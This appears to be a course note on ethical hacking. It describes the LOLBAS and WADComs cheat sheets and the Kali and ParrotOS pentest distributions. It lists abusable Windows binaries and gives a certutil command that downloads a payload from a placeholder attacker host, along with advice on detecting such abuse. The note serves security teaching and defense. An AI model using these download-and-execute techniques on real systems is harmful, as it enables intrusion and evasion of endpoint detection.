### Living-off-the-Land Cheat Sheets and Attacker Toolkits

--> ⚠️ LEGAL / ETHICAL REMINDER: the resources below are legitimate, widely-used reference sites within the security community -- their existence is exactly WHY defenders need to understand them (see the note on detection below). Use them only against systems you own or are explicitly authorized to test.

--> Note 08 (Linux Privilege Escalation) already introduced GTFOBins for Unix/Linux SUID/sudo binary abuse -- this note covers the Windows equivalent and the broader family of these community-maintained "abuse cheat sheet" catalogs, plus the two pentest distros (Kali, ParrotOS) that ship most of the tooling referenced throughout this track.

## LOLBAS -- Living Off the Land Binaries and Scripts (Windows)

--> LOLBAS (lolbas-project.github.io) is the Windows counterpart to GTFOBins -- a curated catalog of standard, LEGITIMATE, Microsoft-signed Windows binaries (`.exe`, `.dll`, `.script` files already present on every Windows install) that can be abused to download files, execute code, bypass application allowlisting, or maintain persistence, without ever dropping a traditional attacker tool onto disk.
--> The core idea ("living off the land") is the same one covered in the Post-Exploitation note's discussion of blending in during lateral movement: using tools ALREADY TRUSTED and present on the system is far less likely to trigger antivirus/EDR signature detection than uploading a custom executable, since the binary itself has a legitimate Microsoft signature and a long history of benign use.
```text
certutil.exe    -->  can download a remote file and/or decode base64, both undocumented/abusable uses of a legitimate certificate-management tool
mshta.exe       -->  executes attacker-controlled HTML Application (.hta) files, including ones fetched directly from a remote URL
regsvr32.exe    -->  can execute a script hosted remotely via its documented (but frequently abused) "scrobj.dll" COM-scriptlet loading behavior - this specific technique is nicknamed "Squiblydoo"
rundll32.exe    -->  can invoke arbitrary exported DLL functions, including from attacker-supplied DLLs
```
```bash
# Example LOLBAS entry usage - certutil abused to download a file, bypassing tools that specifically watch for common download utilities
certutil.exe -urlcache -split -f http://attacker_ip/payload.exe payload.exe
```
--> Each LOLBAS entry documents exactly which abuse category it falls into (Execute, Download, Upload/Exfiltrate, Bypass, Persist) -- mirroring GTFOBins' category-per-binary structure, since both projects are organized the same way for the same reason: a defender or attacker can look up "what can THIS specific binary do" rather than needing to memorize every technique.
--> Detection/blue-team angle: since these are legitimate signed binaries, blocking them outright often breaks normal system function -- effective detection instead focuses on unusual PARAMETERS or PARENT-PROCESS relationships (e.g. `certutil.exe` making an outbound HTTP connection, or `mshta.exe` being spawned by Microsoft Word) rather than the binary's presence alone. This connects directly to the EDR/behavioral-detection content covered in the Cyber Security track's Endpoint Security file.

## WADComs -- Web, Attack and Defense Commands Cheat Sheet

--> WADComs (wadcoms.github.io) is a broader, searchable cheat-sheet site covering ready-to-use commands across web application testing, network attacks, and Active Directory tooling -- rather than being scoped to a single abuse technique like GTFOBins/LOLBAS, it functions as a fast command-lookup reference for tools already covered throughout this track (nmap flags, Hydra/Hashcat syntax from the Password Attacks note, common Metasploit/AD-attack one-liners) so you don't need to keep re-deriving exact flag syntax mid-engagement.
--> The practical value of a site like this during a real engagement or CTF: pentesting involves dozens of tools each with their own flag conventions -- a searchable "how do I do X with tool Y" reference (WADComs, and similarly `tldr` pages or a personal notes file) is a completely normal and expected part of the workflow, not a sign of inexperience -- nobody memorizes every flag for every tool.

## Pentest Distributions -- Kali Linux vs ParrotOS

--> Both are Debian-based Linux distributions that ship pre-installed with the vast majority of tools referenced throughout this Ethical Hacking track (nmap, Metasploit, Burp Suite, Hydra, John the Ripper, aircrack-ng, etc.) -- the point of a dedicated pentest distro is avoiding manually installing/configuring dozens of tools individually on a general-purpose OS.
--> **Kali Linux** (Offensive Security) -- the most widely used and recognized pentest distro, the de facto standard referenced in most courses/certifications (including OSCP) and CTF writeups. Ships in "full" and "lightweight" variants, and has official images purpose-built for Raspberry Pi, cloud providers, and WSL (Windows Subsystem for Linux) install.
--> **ParrotOS (Parrot Security Edition)** -- a similar Debian-based pentest distro with largely overlapping tooling, generally marketed as more lightweight on system resources by default and with a stronger emphasis on privacy/anonymity tooling (Tor/AnonSurf integration) out of the box. Functionally, the choice between the two for most tasks in this track comes down to preference/familiarity rather than a meaningful capability gap -- almost anything doable in Kali is doable in ParrotOS and vice versa, since both are ultimately Debian with the same open-source tools installed on top.
--> Neither distro should be run as a daily-driver general-purpose OS or exposed directly to the internet -- both ship with tools and configurations (some services running as root by default, historically) intended for a controlled lab/engagement environment, not a hardened general-purpose workstation.
